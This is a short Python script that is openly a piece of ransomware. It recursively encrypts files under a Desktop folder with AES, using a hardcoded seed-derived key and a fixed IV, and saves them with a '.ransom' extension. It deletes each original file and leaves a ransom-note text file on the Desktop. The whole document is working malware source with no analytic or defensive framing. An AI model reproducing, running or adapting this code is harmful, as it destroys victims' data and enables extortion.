#!/usr/bin/python
import os
from random import randint
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

#Set the path to encrypt the files
path = [ os.getenv('HOME') + "/Desktop/Important"]

def notification():
    note = "Enter your note here"
    desktop_dir = os.getenv('HOME') + "/Desktop/"
    outputfile = desktop_dir + "READ_THIS_TO_GET_YOUR_FILES.txt"
    handler = open(outputfile,'w')
    handler.write(note)
    handler.close()

def encrypt_file(password,filename):

    chunksize = 65536

    direx, ext = os.path.splitext(filename)
    ext += ' ' * (16 - (len(ext) % 16))

    enc_outputfile = direx + ".ransom"
    file_size = str(os.path.getsize(filename)).zfill(16)
    init_vector = ''

    for i in range(16):
        init_vector += chr(7)
	

    encryptor = AES.new(password,AES.MODE_CBC, init_vector)
    with open(filename, 'rb') as file_handler:
        with open(enc_outputfile, 'wb') as outputfile_handler:
            while True:
                chunk_read = file_handler.read(chunksize)
                if len(chunk_read) == 0:
                    break
                elif len(chunk_read) % 16 != 0:
                    chunk_read += ' ' * (16 - (len(chunk_read) % 16))
                outputfile_handler.write(encryptor.encrypt(chunk_read))

    os.unlink(filename) #original file is deleted



notification()
for paths in path:
    for root, dirs, files in os.walk(paths):
        for names in files:
            print names+'\r'
            print root+'\r'
            encrypt_file(SHA256.new("this_is_the_seed").digest(),str(os.path.join(root,names)))
